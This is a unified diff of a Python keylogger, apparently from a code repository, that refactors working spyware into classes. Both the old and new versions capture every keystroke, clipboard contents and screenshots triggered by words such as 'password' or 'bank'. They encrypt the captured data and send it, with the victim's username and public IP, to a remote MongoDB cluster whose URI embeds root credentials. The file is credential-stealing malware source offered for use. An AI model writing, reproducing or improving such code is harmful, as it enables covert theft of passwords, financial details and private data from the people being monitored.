@@ -1,3 +1,4 @@
+
 import time
 import threading
 import pymongo
@@ -6,178 +7,206 @@ import base64
 import requests
 import getpass
 import pyautogui
+import os
+import zlib
 from Crypto.Cipher import AES
 from pynput import keyboard
 import io
-from datetime import datetime, timezone, timedelta
-
-
-# ------------------------------
-# Configuration Constants
-# ------------------------------
-AES_KEY = bytes.fromhex("82d5d6060dff58f5875d520a6202b5384cfba4779a9db4e9c59ca3bce444a53e")
-MONGO_URI = "mongodb+srv://root:root@cluster0.m8lbp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
-SENSITIVE_WORDS = ["bank", "password", "login", "credit"]
-
-# ------------------------------
-# Database Setup
-# ------------------------------
-client = pymongo.MongoClient(MONGO_URI)
-db = client["keylogger2_db"]
-logs_collection = db["logs"]
-screenshots_collection = db["screenshots"]
-clipboard_collection = db["clipboard_logs"]
-
-# ------------------------------
-# System Information
-# ------------------------------
-USERNAME = getpass.getuser()
-
-def get_public_ip():
-    try:
-        return requests.get("https://api64.ipify.org?format=json").json().get("ip", "Unknown IP")
-    except Exception:
-        return "Unknown IP"
-
-USER_IP = get_public_ip()
-
-# ------------------------------
-# Encryption Functions
-# ------------------------------
-def encrypt_data(data: str) -> str:
-    cipher = AES.new(AES_KEY, AES.MODE_GCM)
-    ciphertext, tag = cipher.encrypt_and_digest(data.encode("utf-8"))
-    return base64.b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")
-
-def decrypt_data(enc_text: str) -> str:
-    try:
-        raw = base64.b64decode(enc_text)
-        nonce, tag, ctext = raw[:16], raw[16:32], raw[32:]
-        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
-        return cipher.decrypt_and_verify(ctext, tag).decode("utf-8")
-    except Exception:
-        return ""
-
-# ------------------------------
-# Utility: Get Correct Local Timestamp with Milliseconds
-# ------------------------------
 from datetime import datetime
+from typing import Optional
+from pymongo.errors import ConnectionFailure
 
-def get_local_timestamp():
-    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]  # ✅ Stores as a formatted string
+# Configuration Constants
+AES_KEY = os.getenv('AES_KEY', bytes.fromhex("82d5d6060dff58f5875d520a6202b5384cfba4779a9db4e9c59ca3bce444a53e"))
+MONGO_URI = os.getenv('MONGO_URI', "mongodb+srv://root:root@cluster0.m8lbp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
+SENSITIVE_WORDS = ["bank", "password", "login", "credit"]
+MAX_RETRIES = 3
+BATCH_SIZE = 50
+RATE_LIMIT = 100  # Max operations per minute
 
+class RateLimiter:
+    def __init__(self, max_ops: int, interval: int = 60):
+        self.max_ops = max_ops
+        self.interval = interval
+        self.operations = []
+        self._lock = threading.Lock()
+    
+    def can_proceed(self) -> bool:
+        current_time = time.time()
+        with self._lock:
+            self.operations = [op for op in self.operations if current_time - op < self.interval]
+            if len(self.operations) < self.max_ops:
+                self.operations.append(current_time)
+                return True
+        return False
 
+class DatabaseManager:
+    def __init__(self):
+        self.client = None
+        self.rate_limiter = RateLimiter(RATE_LIMIT)
+        self.connect_with_retry()
 
+    def connect_with_retry(self):
+        for attempt in range(MAX_RETRIES):
+            try:
+                self.client = pymongo.MongoClient(MONGO_URI)
+                self.db = self.client["keylogger2_db"]
+                self.logs = self.db["logs"]
+                self.screenshots = self.db["screenshots"]
+                self.clipboard = self.db["clipboard_logs"]
+                self.client.admin.command('ping')
+                return
+            except ConnectionFailure:
+                if attempt == MAX_RETRIES - 1:
+                    raise
+                time.sleep(2 ** attempt)
 
-# ------------------------------
-# Screenshot Capture
-# ------------------------------
-def capture_screenshot():
-    try:
-        screenshot = pyautogui.screenshot()
-        buffer = io.BytesIO()
-        screenshot.save(buffer, format="PNG")
-        img_bytes = buffer.getvalue()
-
-        encrypted_screenshot = encrypt_data(base64.b64encode(img_bytes).decode())
-        screenshots_collection.insert_one({
-            "ip": USER_IP,
-            "user": USERNAME,
-            "screenshot": encrypted_screenshot,
-            "timestamp": get_local_timestamp()  # ✅ Store local time in MongoDB
-        })
-        print(f"[SCREENSHOT] Captured at {get_local_timestamp()}")
-    except Exception as e:
-        print(f"[ERROR] Screenshot failed: {e}")
-
-# ------------------------------
-# Clipboard Logger
-# ------------------------------
-def log_clipboard():
-    last_clipboard = ""
-    while True:
+    def insert_document(self, collection: str, document: dict) -> bool:
+        if not self.rate_limiter.can_proceed():
+            return False
+        
         try:
-            content = pyperclip.paste().strip()
-            if content and content != last_clipboard:
-                clipboard_collection.insert_one({
-                    "ip": USER_IP,
-                    "user": USERNAME,
-                    "clipboard": encrypt_data(content),
-                    "timestamp": get_local_timestamp()  # ✅ Store local time
-                })
-                last_clipboard = content
+            getattr(self, collection).insert_one(document)
+            return True
         except Exception as e:
-            print(f"[ERROR] Clipboard logging failed: {e}")
-        time.sleep(5)
+            print(f"[ERROR] Database insert failed: {e}")
+            return False
 
-# ------------------------------
-# Keystroke Logging (Each Keystroke Logged Separately)
-# ------------------------------
-keystroke_batch = []
-batch_lock = threading.Lock()
+class Encryptor:
+    @staticmethod
+    def compress_and_encrypt(data: str) -> str:
+        compressed = zlib.compress(data.encode("utf-8"))
+        cipher = AES.new(AES_KEY, AES.MODE_GCM)
+        ciphertext, tag = cipher.encrypt_and_digest(compressed)
+        return base64.b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")
 
-def on_press(key):
-    global keystroke_batch
-    try:
+    @staticmethod
+    def decrypt_and_decompress(enc_text: str) -> str:
+        try:
+            raw = base64.b64decode(enc_text)
+            nonce, tag, ctext = raw[:16], raw[16:32], raw[32:]
+            cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
+            compressed = cipher.decrypt_and_verify(ctext, tag)
+            return zlib.decompress(compressed).decode("utf-8")
+        except Exception:
+            return ""
+
+class KeyLogger:
+    def __init__(self):
+        self.db = DatabaseManager()
+        self.encryptor = Encryptor()
+        self.username = getpass.getuser()
+        self.ip = self.get_public_ip()
+        self.keystroke_batch = []
+        self.batch_lock = threading.Lock()
+
+    @staticmethod
+    def get_public_ip() -> str:
+        try:
+            return requests.get("https://api64.ipify.org?format=json", timeout=5).json().get("ip", "Unknown IP")
+        except Exception:
+            return "Unknown IP"
+
+    @staticmethod
+    def get_timestamp() -> str:
+        return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+
+    def capture_screenshot(self):
+        try:
+            screenshot = pyautogui.screenshot()
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format="PNG", optimize=True, quality=85)
+            img_bytes = buffer.getvalue()
+            
+            doc = {
+                "ip": self.ip,
+                "user": self.username,
+                "screenshot": self.encryptor.compress_and_encrypt(base64.b64encode(img_bytes).decode()),
+                "timestamp": self.get_timestamp()
+            }
+            
+            if self.db.insert_document("screenshots", doc):
+                print(f"[SCREENSHOT] Captured at {doc['timestamp']}")
+        except Exception as e:
+            print(f"[ERROR] Screenshot failed: {e}")
+
+    def log_clipboard(self):
+        last_clipboard = ""
+        while True:
+            try:
+                content = pyperclip.paste().strip()
+                if content and content != last_clipboard:
+                    doc = {
+                        "ip": self.ip,
+                        "user": self.username,
+                        "clipboard": self.encryptor.compress_and_encrypt(content),
+                        "timestamp": self.get_timestamp()
+                    }
+                    if self.db.insert_document("clipboard", doc):
+                        last_clipboard = content
+            except Exception as e:
+                print(f"[ERROR] Clipboard logging failed: {e}")
+            time.sleep(5)
+
+    def on_press(self, key):
+        try:
+            keystroke = self.parse_key(key)
+            timestamp = self.get_timestamp()
+
+            doc = {
+                "ip": self.ip,
+                "user": self.username,
+                "keystroke": self.encryptor.compress_and_encrypt(keystroke),
+                "timestamp": timestamp
+            }
+
+            if self.db.insert_document("logs", doc):
+                print(f"[LOG] Key: {keystroke} at {timestamp}")
+
+            with self.batch_lock:
+                self.keystroke_batch.append(keystroke)
+
+        except Exception as e:
+            print(f"[ERROR] Keystroke logging failed: {e}")
+
+    @staticmethod
+    def parse_key(key) -> str:
         if key == keyboard.Key.backspace:
-            keystroke = "[BACKSPACE]"
+            return "[BACKSPACE]"
         elif key == keyboard.Key.enter:
-            keystroke = "[ENTER]"
+            return "[ENTER]"
         elif key == keyboard.Key.space:
-            keystroke = " "
+            return " "
         elif hasattr(key, 'char') and key.char is not None:
-            keystroke = key.char
-        else:
-            keystroke = f"[{key}]"
+            return key.char
+        return f"[{key}]"
 
-        timestamp = get_local_timestamp()  # ✅ Correct timestamp format with local timezone
+    def analyze_keystroke_batch(self):
+        while True:
+            time.sleep(3)
+            with self.batch_lock:
+                if not self.keystroke_batch:
+                    continue
+                typed_text = "".join(self.keystroke_batch).lower()
+                self.keystroke_batch = []
 
-        # Insert one document per keystroke
-        doc = {
-            "ip": USER_IP,
-            "user": USERNAME,
-            "keystroke": encrypt_data(keystroke),
-            "timestamp": timestamp  # ✅ Store timestamp as datetime object
-        }
-        logs_collection.insert_one(doc)
-        print(f"[LOG] Key: {keystroke} at {timestamp}")
+            if any(word in typed_text for word in SENSITIVE_WORDS):
+                print(f"[ALERT] Sensitive word detected in batch")
+                threading.Thread(target=self.capture_screenshot, daemon=True).start()
 
-        # Append keystroke to local batch (for checking sensitive words)
-        with batch_lock:
-            keystroke_batch.append(keystroke)
+    def start(self):
+        threading.Thread(target=self.log_clipboard, daemon=True).start()
+        threading.Thread(target=self.analyze_keystroke_batch, daemon=True).start()
 
-    except Exception as e:
-        print(f"[ERROR] Keystroke logging failed: {e}")
+        try:
+            with keyboard.Listener(on_press=self.on_press) as listener:
+                print("[INFO] Keylogger started. Press CTRL+C to stop.")
+                listener.join()
+        except KeyboardInterrupt:
+            print("[INFO] Stopping keylogger...")
+            if self.db.client:
+                self.db.client.close()
 
-# ------------------------------
-# Batch Processing for Sensitive Word Detection
-# ------------------------------
-def analyze_keystroke_batch():
-    global keystroke_batch
-    while True:
-        time.sleep(3)  # Check every 3 seconds
-        with batch_lock:
-            if not keystroke_batch:
-                continue  # Skip if batch is empty
-            typed_text = "".join(keystroke_batch).lower()
-            keystroke_batch = []  # Clear batch after analysis
-
-        # Check for sensitive words in full typed text
-        if any(word in typed_text for word in SENSITIVE_WORDS):
-            print(f"[ALERT] Sensitive word detected in batch: {typed_text}")
-            threading.Thread(target=capture_screenshot, daemon=True).start()
-
-# ------------------------------
-# Start Keylogger
-# ------------------------------
 if __name__ == "__main__":
-    threading.Thread(target=log_clipboard, daemon=True).start()
-    threading.Thread(target=analyze_keystroke_batch, daemon=True).start()
-
-    try:
-        with keyboard.Listener(on_press=on_press) as listener:
-            print("[INFO] Keylogger started. Press CTRL+C to stop.")
-            listener.join()
-    except KeyboardInterrupt:
-        print("[INFO] Stopping keylogger...")
-        client.close()
+    keylogger = KeyLogger()
+    keylogger.start()
